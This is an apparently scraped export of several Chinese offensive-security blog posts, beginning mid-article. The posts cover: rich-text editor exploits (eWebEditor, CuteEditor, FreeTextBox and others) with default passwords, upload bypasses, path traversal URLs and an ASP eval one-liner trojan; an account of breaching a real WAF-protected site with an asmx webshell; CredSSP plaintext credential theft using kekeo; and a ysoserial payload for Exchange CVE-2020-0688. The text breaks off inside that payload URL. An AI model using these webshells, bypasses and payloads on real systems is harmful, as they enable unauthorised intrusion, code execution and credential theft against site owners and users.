class="hljs-regexp">/db/</span>db.mdb<br>[PATH]<span class="hljs-regexp">/db/</span>%<span class="hljs-number">23</span>ewebeditor.mdb<br></code></pre></td></tr></table></figure><p>默认密码：</p><p>admin/admin888 、 admin/admin、 admin/123456 、admin/admin999</p><p>1、点击“样式管理”—可以选择新增样式，或者修改一个非系统样式，将其中图片控件所允许的上传类型后面加上|asp、|asa、|aaspsp或|cer，只要是服务器允许执行的脚本类型即可，点击“提交”并设置工具栏—将“插入图片”控件添加上。而后—预览此样式，点击插入图片，上传WEBSHELL，在“代码”模式中查看上传文件的路径。</p><p>2、当数据库被管理员修改为asp、asa后缀的时候，可以插一句话木马服务端进入数据库，然后一句话木马客户端连接拿下webshell</p><p>3、上传后无法执行？目录没权限？帅锅你回去样式管理看你编辑过的那个样式，里面可以自定义上传路径的！！！</p><p>4、设置好了上传类型，依然上传不了麽？估计是文件代码被改了，可以尝试设定“远程类型”依照6.0版本拿SHELL的方法来做（详情见下文↓），能够设定自动保存远程文件的类型。</p><p>5、不能添加工具栏，但设定好了某样式中的文件类型，怎么办？↓这么办！<br>(请修改action字段)<br>Action.html</p><p>6、需要突破上传文件类型限制么？Come here! —&gt;&gt; 将图片上传类型修改为“aaspsp;”(不含引号)，将一句话shell文件名改为“1.asp;”(不含引号)并上传即可。—&gt;本条信息来源：微笑刺客</p><h3 id="eWebEditor-可下载数据库，但密文解不开"><a href="#eWebEditor-可下载数据库，但密文解不开" class="headerlink" title="eWebEditor 可下载数据库，但密文解不开"></a>eWebEditor 可下载数据库，但密文解不开</h3><p>脆弱描述：</p><p>当我们下载数据库后查询不到密码MD5的明文时，可以去看看webeditor_style(14)这个样式表，看看是否有前辈入侵过 或许已经赋予了某控件上传脚本的能力，构造地址来上传我们自己的WEBSHELL.</p><p>攻击利用:</p><p>比如 ID=46 s-name =standard1</p><p>构造 代码: ewebeditor.asp?id=content&amp;style=standard</p><p>ID和和样式名改过后<br>ewebeditor.asp?id=46&amp;style=standard1</p><h3 id="eWebEditor遍历目录漏洞"><a href="#eWebEditor遍历目录漏洞" class="headerlink" title="eWebEditor遍历目录漏洞"></a>eWebEditor遍历目录漏洞</h3><p>脆弱描述：<br>ewebeditor/admin_uploadfile.asp<br>admin/upload.asp<br>过滤不严，造成遍历目录漏洞</p><p>攻击利用:</p><p>第一种:ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=<a href="http://www.xxxx.com/">http://www.xxxx.com/../</a>.. 看到整个网站文件了<br>第二种: ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =./..</p><h3 id="eWebEditor-5-2-列目录漏洞"><a href="#eWebEditor-5-2-列目录漏洞" class="headerlink" title="eWebEditor 5.2 列目录漏洞"></a>eWebEditor 5.2 列目录漏洞</h3><p>脆弱描述：<br>ewebeditor/asp/browse.asp<br>过滤不严，造成遍历目录漏洞<br>攻击利用：<br><a href="http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=%E2%80%A6././/">http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/</a>..</p><h3 id="利用eWebEditor-session欺骗漏洞-进入后台"><a href="#利用eWebEditor-session欺骗漏洞-进入后台" class="headerlink" title="利用eWebEditor session欺骗漏洞,进入后台"></a>利用eWebEditor session欺骗漏洞,进入后台</h3><p>脆弱描述：<br>漏洞文件:Admin_Private.asp<br>只判断了session，没有判断cookies和路径的验证问题。<br>攻击利用:<br>新建一个test.asp内容如下:<br>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;<br>访问test.asp，再访问后台任何文件，for example:Admin_Default.asp</p><h3 id="eWebEditor-asp版-2-1-6-上传漏洞"><a href="#eWebEditor-asp版-2-1-6-上传漏洞" class="headerlink" title="eWebEditor asp版 2.1.6 上传漏洞"></a>eWebEditor asp版 2.1.6 上传漏洞</h3><p>攻击利用:（请修改action字段为指定网址）<br>ewebeditor asp版2.1.6上传漏洞利用程序.html</p><h3 id="eWebEditor-2-7-0-注入漏洞"><a href="#eWebEditor-2-7-0-注入漏洞" class="headerlink" title="eWebEditor 2.7.0 注入漏洞"></a>eWebEditor 2.7.0 注入漏洞</h3><p>攻击利用:<br><a href="http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200">http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200</a><br>默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.</p><h3 id="eWebEditor2-8-0最终版删除任意文件漏洞"><a href="#eWebEditor2-8-0最终版删除任意文件漏洞" class="headerlink" title="eWebEditor2.8.0最终版删除任意文件漏洞"></a>eWebEditor2.8.0最终版删除任意文件漏洞</h3><p>脆弱描述：<br>此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。<br>攻击利用: (请修改action字段为指定网址)<br>Del Files.html</p><h3 id="eWebEditor-PHP-ASP-后台通杀漏洞"><a href="#eWebEditor-PHP-ASP-后台通杀漏洞" class="headerlink" title="eWebEditor PHP/ASP 后台通杀漏洞"></a>eWebEditor PHP/ASP 后台通杀漏洞</h3><p>影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。<br>攻击利用:<br>进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.<br>这时候你清空浏览器的url,然后输入</p><p>javascript:alert(document.cookie=”adminuser=”+escape(“admin”));<br>javascript:alert(document.cookie=”adminpass=”+escape(“admin”));<br>javascript:alert(document.cookie=”admindj=”+escape(“1”));</p><p>而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。</p><h3 id="eWebEditor-for-php任意文件上传漏洞"><a href="#eWebEditor-for-php任意文件上传漏洞" class="headerlink" title="eWebEditor for php任意文件上传漏洞"></a>eWebEditor for php任意文件上传漏洞</h3><p>影响版本:ewebeditor php v3.8 or older version<br>脆弱描述:<br>此版本将所有的风格配置信息保存为一个数组$aStyle,在php.ini配置register_global为on的情况下我们可以任意添加自己喜欢的风格，并定义上传类型。<br>攻击利用:<br>phpupload.html</p><h3 id="eWebEditor-JSP版漏洞"><a href="#eWebEditor-JSP版漏洞" class="headerlink" title="eWebEditor JSP版漏洞"></a>eWebEditor JSP版漏洞</h3><p>大同小异，我在本文档不想多说了，因为没环境 测试，网上垃圾场那么大，不好排查。用JSP编辑器的我觉得eweb会比FCKeditor份额少得多。</p><h3 id="eWebEditor-2-8-商业版插一句话木马"><a href="#eWebEditor-2-8-商业版插一句话木马" class="headerlink" title="eWebEditor 2.8 商业版插一句话木马"></a>eWebEditor 2.8 商业版插一句话木马</h3><p>影响版本:=&gt;2.8 商业版<br>攻击利用:<br>登陆后台，点击修改密码—-新密码设置为 <code>1&quot;:eval request(&quot;h&quot;)’</code><br>设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.</p><p>注意：可能因为转载的关系，代码会变掉，最好本地调试好代码再提交。</p><h3 id="eWebEditorNet-upload-aspx-上传漏洞-WebEditorNet"><a href="#eWebEditorNet-upload-aspx-上传漏洞-WebEditorNet" class="headerlink" title="eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)"></a>eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)</h3><p>脆弱描述：<br>WebEditorNet 主要是一个upload.aspx文件存在上传漏洞。<br>攻击利用:<br>默认上传地址：/ewebeditornet/upload.aspx<br>可以直接上传一个cer的木马<br>如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();<br>成功以后查看源代码找到uploadsave查看上传保存地址，默认传到uploadfile这个文件夹里。</p><h3 id="southidceditor-一般使用v2-8-0版eWeb核心"><a href="#southidceditor-一般使用v2-8-0版eWeb核心" class="headerlink" title="southidceditor(一般使用v2.8.0版eWeb核心)"></a>southidceditor(一般使用v2.8.0版eWeb核心)</h3><p><a href="http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdb">http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdb</a><br><a href="http://www.xxxx.com/admin/southidceditor/admin/admin_login.asp">http://www.xxxx.com/admin/southidceditor/admin/admin_login.asp</a><br><a href="http://www.xxxx.com/admin/southidceditor/popup.asp">http://www.xxxx.com/admin/southidceditor/popup.asp</a><br>bigcneditor(eWeb 2.7.5 VIP核心)</p><p>其实所谓的Bigcneditor就是eWebEditor 2.7.5的VIP用户版.之所以无法访问admin_login.asp，提示“权限不够”4字真言，估计就是因为其授权“Licensed”问题,或许只允许被授权的机器访问后台才对。</p><p>或许上面针对eWebEditor v2.8以下低版本的小动作可以用到这上面来.貌似没多少动作</p><p><strong>Cute Editor</strong></p><h3 id="Cute-Editor在线编辑器本地包含漏洞"><a href="#Cute-Editor在线编辑器本地包含漏洞" class="headerlink" title="Cute Editor在线编辑器本地包含漏洞"></a>Cute Editor在线编辑器本地包含漏洞</h3><p>影响版本:<br>CuteEditor For Net 6.4<br>脆弱描述：<br>可以随意查看网站文件内容，危害较大。<br>攻击利用:<br><a href="http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config">http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</a></p><h3 id="Cute-Editor-Asp-Net版利用iis解析漏洞获得权限"><a href="#Cute-Editor-Asp-Net版利用iis解析漏洞获得权限" class="headerlink" title="Cute Editor Asp.Net版利用iis解析漏洞获得权限"></a>Cute Editor Asp.Net版利用iis解析漏洞获得权限</h3><p>影响版本：<br>CuteEditor for ASP.NET中文版脆弱描述：<br>脆弱描述：<br>CuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。<br>攻击利用：<br>可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。<br>在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。</p><h2 id="Webhtmleditor"><a href="#Webhtmleditor" class="headerlink" title="Webhtmleditor"></a>Webhtmleditor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本：&lt;= Webhtmleditor最终版1.7 (已停止更新)<br>脆弱描述/攻击利用：<br>对上传的图片或其他文件无重命名操作，导致允许恶意用户上传diy.asp;.jpg来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。</p><h2 id="Kindeditor"><a href="#Kindeditor" class="headerlink" title="Kindeditor"></a>Kindeditor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL-1"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL-1" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本: &lt;= kindeditor 3.2.1(09年8月份发布的最新版)<br>脆弱描述/攻击利用：<br>拿官方做个演示：进入<a href="http://www.xxxx.com/ke/examples/index.html">http://www.xxxx.com/ke/examples/index.html</a> 随意点击一个demo后点图片上传，某君上传了如下文件：<a href="http://www.xxxx.com/ke/attached/test.asp;.jpg">http://www.xxxx.com/ke/attached/test.asp;.jpg</a><br>Note:参见附录C原理解析。</p><h2 id="Freetextbox"><a href="#Freetextbox" class="headerlink" title="Freetextbox"></a>Freetextbox</h2><h3 id="Freetextbox遍历目录漏洞"><a href="#Freetextbox遍历目录漏洞" class="headerlink" title="Freetextbox遍历目录漏洞"></a>Freetextbox遍历目录漏洞</h3><p>影响版本：未知<br>脆弱描述：<br>因为ftb.imagegallery.aspx代码中 只过滤了/但是没有过滤\符号所以导致出现了遍历目录的问题。<br>攻击利用:<br>在编辑器页面点图片会弹出一个框（抓包得到此地址）构造如下，可遍历目录。<br><a href="http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=%5C">http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\</a>..</p><h3 id="Freetextbox-Asp-Net版利用IIS解析漏洞获得权限"><a href="#Freetextbox-Asp-Net版利用IIS解析漏洞获得权限" class="headerlink" title="Freetextbox Asp.Net版利用IIS解析漏洞获得权限"></a>Freetextbox Asp.Net版利用IIS解析漏洞获得权限</h3><p>影响版本：所有版本<br>脆弱描述：<br>没做登陆验证可以直接访问上传木马<br>Freetextbox 3-3-1 可以直接上传任意格式的文件<br>Freetextbox 1.6.3 及其他版本可以上传 格式为x.asp;.jpg<br>攻击利用：<br>利用IIS解析漏洞拿SHELL。上传后SHELL的路径为<a href="http://www.xxxx.com/images/x.asp;.jpg">http://www.xxxx.com/images/x.asp;.jpg</a></p><h2 id="Msn-editor"><a href="#Msn-editor" class="headerlink" title="Msn editor"></a>Msn editor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL-2"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL-2" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本：未知</p><p>脆弱描述：</p><p>点击图片上传后会出现上传页面，地址为<br><a href="http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=">http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=</a><br>用普通的图片上传后，地址为<br><a href="http://www.xxxx.com/news/uppic/41513102009204012_1.gif">http://www.xxxx.com/news/uppic/41513102009204012_1.gif</a><br>记住这时候的路径，再点击图片的上传，这时候地址就变成了<br><a href="http://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012">http://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012</a><br>很明显。图片的地址是根据RemNum后面的编号生成的。</p><p>攻击利用:</p><p>配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址<br><a href="http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012">http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012</a><br>然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址<br>uppic/1.asp;41513102009204012_2.gif<br>直接打开就是我们的小马地址！</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>asmx webshell之旅</title>
    <link href="/2021/02/03/asmx/"/>
    <url>/2021/02/03/asmx/</url>
    
    <content type="html"><![CDATA[<h1 id="asmx-webshell之旅"><a href="#asmx-webshell之旅" class="headerlink" title="asmx webshell之旅"></a>asmx webshell之旅</h1><p>这是一次实战中的经历</p><p>遇到一个存在任意文件上传的上传点。但是网站有waf，带有恶意流量就会拦截。这个waf确实有点东西，base64和简单的替换字符都会被识别并且拦截。</p><p>尝试了一遍后缀名，发现只可以上传asmx文件，所以开始尝试能不能用asmx去getshell</p><p>发现了一个师傅的文章：<a href="https://www.jianshu.com/p/a189e0d1790b">https://www.jianshu.com/p/a189e0d1790b</a></p><p>通过构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ WebService Language&#x3D;&quot;JScript&quot; class&#x3D;&quot;asmxWebMethodSpy&quot;%&gt;<br>import System;<br>import System.Web;<br>import System.IO;<br>import System.Web.Services;<br>public class asmxWebMethodSpy extends WebService<br>&#123;      <br>    WebMethodAttribute function Invoke(Ivan: String) : Void<br>    &#123;<br>           var I &#x3D; HttpContext.Current;<br>        var Request &#x3D; I.Request;<br>        var Response &#x3D; I.Response;<br>        var Server &#x3D; I.Server;<br>            Response.Write(&quot;&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href&#x3D;&#39;https:&#x2F;&#x2F;github.com&#x2F;Ivan1ee&#39;&gt;Ivan1ee&lt;&#x2F;a&gt;&lt;&#x2F;H1&gt;&quot;);<br>        eval(Ivan);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以实现.net代码执行</p><p>在上传的时候就遇到了第一个问题，被waf拦截了，于是我部分删除来探测是哪条语句被waf识别，最终发现是</p><p><code>language=jscript</code> 被识别。将他改成 <code>language=javascript</code> 就可以绕过这层waf。</p><p>成功上传以后访问会是如下页面</p><p><img src="/img/article/223.jpg" alt="img"></p><p>发送以下数据包会执行 .net 代码打印出时间。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/UploadFiles/Content/file/xxx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.xxx.xxx<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1771<br><span class="hljs-attribute">SOAPAction</span><span class="hljs-punctuation">: </span>&quot;http://tempuri.org/Invoke&quot;<br><br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;<br>  &lt;soap:Body&gt;<br>    &lt;Invoke xmlns=&quot;http://tempuri.org/&quot;&gt;<br>      &lt;Ivan&gt;Response.Write(DateTime.Now);&lt;/Ivan&gt;<br>    &lt;/Invoke&gt;<br>  &lt;/soap:Body&gt;<br>&lt;/soap:Envelope&gt;<br></code></pre></td></tr></table></figure><p>但这个地方是通过soap来传递参数，蚁剑和🔪是连接不了的。</p><p>而当传执行命令的代码时，果不其然又被拦截了，离谱的是连base64过后或者替换的都不行。</p><p>于是决定写一个webshell进去。</p><p>一开始想直接写进去，但是直接写果不其然也被拦了。然后尝试整个base，也不行。</p><p>最后我放弃了，决定一行一行的写进去，构造了一会，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">System.IO.File.WriteAllText(&quot;D:\\CDTRW\\UploadFiles\\Person\\8.aspx&quot;, System.IO.File.ReadAllText(&quot;D:\\CDTRW\\UploadFiles\\Person\\8.aspx&quot;)+&quot;\n&quot;+System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(&#39;PCUKdmFyIGE9UmVxdWVzdC5Gb3JtKCJ4Iik7&#39;)));<br></code></pre></td></tr></table></figure><p>直接 <code>System.IO.File.WriteAllText</code> 会覆写文件，用这行代码可以续写进文件。</p><p>直接访问还会报错说全局主题未定义，很难顶，添加如下代码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;% EnableTheming &#x3D; &quot;False&quot; StylesheetTheme&#x3D;&quot;&quot; Theme&#x3D;&quot;&quot; %&gt;<br></code></pre></td></tr></table></figure><p>一开始写的蚁剑，连接被拦截，后来写了冰蝎总算是成了。</p><p>这是一个整整搞了一个下午的站 T_T</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Real</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Credssp</title>
    <link href="/2021/02/03/credssp/"/>
    <url>/2021/02/03/credssp/</url>
    
    <content type="html"><![CDATA[<h1 id="Credssp利用"><a href="#Credssp利用" class="headerlink" title="Credssp利用"></a>Credssp利用</h1><h2 id="credssp"><a href="#credssp" class="headerlink" title="credssp"></a>credssp</h2><p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器</p><p>CredSSP通常应用于远程桌面服务(Remote Desktop Protocol)和Windows远程管理(Windows Remote Management)（例如Powershell Remoting）</p><p>CredSSP提供了加密的传输层安全协议通道。协商协议使用Kerberos和NTLM</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>综上，如果我们实现以下操作：</p><ul><li>修改主机A的组策略，设置为自动发送当前用户的凭据</li><li>在主机B上面实现服务端的功能，接收主机A发送的请求</li></ul><p>那么当我们控制主机A连接主机B时，主机B就能够获得主机A用户的明文口令</p><p>CredSSP协议细节可参考：</p><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cssp/85f57821-40bb-46aa-bfcb-ba9590b8fc30">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cssp/85f57821-40bb-46aa-bfcb-ba9590b8fc30</a></p><p>更近一步，如果我们实现以下操作：</p><ul><li>修改主机A的组策略，设置为自动发送当前用户的凭据</li><li>在主机A上面实现服务端的功能，接收主机A自己发送的请求</li></ul><p>我们同样能够获得用户的明文口令</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol><li><p>通过注册表修改组策略</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add hklm<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>redentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1<br>reg add hklm<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>redentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1<br>reg add hklm<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>redentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1<br>reg add hklm<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>redentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1<br>reg add hklm<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>redentialsDelegation<span class="hljs-symbol">\A</span>llowDefaultCredentials /v 1 /t REG_SZ /d *<br>reg add hklm<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>redentialsDelegation<span class="hljs-symbol">\A</span>llowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d *<br></code></pre></td></tr></table></figure><p>添加后需要用户重新认证平局才会被存储。</p></li><li><p>域内本机</p><p>使用 <code>kekeo</code>(普通用户权限) :</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">tsssp</span><span class="hljs-selector-pseudo">::server</span><br><span class="hljs-selector-tag">tsssp</span><span class="hljs-selector-pseudo">::client</span> /<span class="hljs-selector-tag">target</span><span class="hljs-selector-pseudo">:anyword</span><br></code></pre></td></tr></table></figure></li><li><p>域内远程</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># system权限</span><br>tsssp::server<br></code></pre></td></tr></table></figure><p>远程机器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">tsssp</span><span class="hljs-selector-pseudo">::client</span> /<span class="hljs-selector-tag">target</span><span class="hljs-selector-pseudo">:TERMSRV</span>/<span class="hljs-selector-tag">COMPUTER01</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span> /<span class="hljs-selector-tag">pipe</span>:\\<span class="hljs-selector-tag">COMPUTER01</span><span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>\<span class="hljs-selector-tag">pipe</span>\<span class="hljs-selector-tag">kekeo_tsssp_endpoint</span><br></code></pre></td></tr></table></figure><p>这里使用的参数为域内计算机帐户对应的SPN</p><p>查看test域内所有spn</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn<span class="hljs-selector-class">.exe</span> -T test -<span class="hljs-selector-tag">q</span> *<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2></li></ol><p>不需要利用lsass，绕过edr检测</p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cve-2020-0688</title>
    <link href="/2021/02/03/2020-0688/"/>
    <url>/2021/02/03/2020-0688/</url>
    
    <content type="html"><![CDATA[<h1 id="Exchange-cve-2020-0688"><a href="#Exchange-cve-2020-0688" class="headerlink" title="Exchange cve-2020-0688"></a>Exchange cve-2020-0688</h1><p>针对excahnge ecp接口的反序列化攻击</p><ol><li><p>收集参数</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--validationkey</span> = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）<br><br><span class="hljs-attr">--validationalg</span> = SHA1（默认，漏洞产生原因）<br><br><span class="hljs-attr">--generator</span> = B97B4E27（基本默认）<br><br><span class="hljs-attr">--viewstateuserkey</span> = d673d1a4-<span class="hljs-number">1794</span>-<span class="hljs-number">403</span>e-ab96-e283ca880ef2（手工获取，变量，每次登陆都不一致）<br></code></pre></td></tr></table></figure></li><li><p>生成payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="hljs-string">&quot;calc.exe&quot;</span> --validationalg=<span class="hljs-string">&quot;SHA1&quot;</span> --validationkey=<span class="hljs-string">&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot;</span> --generator=<span class="hljs-string">&quot;B97B4E27&quot;</span> --viewstateuserkey=<span class="hljs-string">&quot;d673d1a4-1794-403e-ab96-e283ca880ef2&quot;</span> --isdebug --islegacy<br></code></pre></td></tr></table></figure></li><li><p>对payload进行url编码</p></li><li><p>地址</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://<span class="hljs-number">192.168.1.248</span>/ecp/default.aspx?__VIEWSTATEGENERATOR=B<span class="hljs-number">97</span>B<span class="hljs-number">4</span>E<span class="hljs-number">27</span>&amp;__VIEWSTATE=%<span class="hljs-number">2</span>FwEyhAYAAQAAAP%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">8</span>BAAAAAAAAAAwCAAAAXk<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">5</span>Qb<span class="hljs-number">3</span>dlclNoZWxsLkVkaXRvciwgVmVyc<span class="hljs-number">2</span>lvbj<span class="hljs-number">0</span>zLjAuMC<span class="hljs-number">4</span>wLCBDdWx<span class="hljs-number">0</span>dXJlPW<span class="hljs-number">5</span>ldXRyYWwsIFB<span class="hljs-number">1</span>YmxpY<span class="hljs-number">0</span>tleVRva<span class="hljs-number">2</span>VuPTMxYmYzODU<span class="hljs-number">2</span>YWQzNjRlMzUFAQAAAEJNaWNyb<span class="hljs-number">3</span>NvZnQuVmlzdWFsU<span 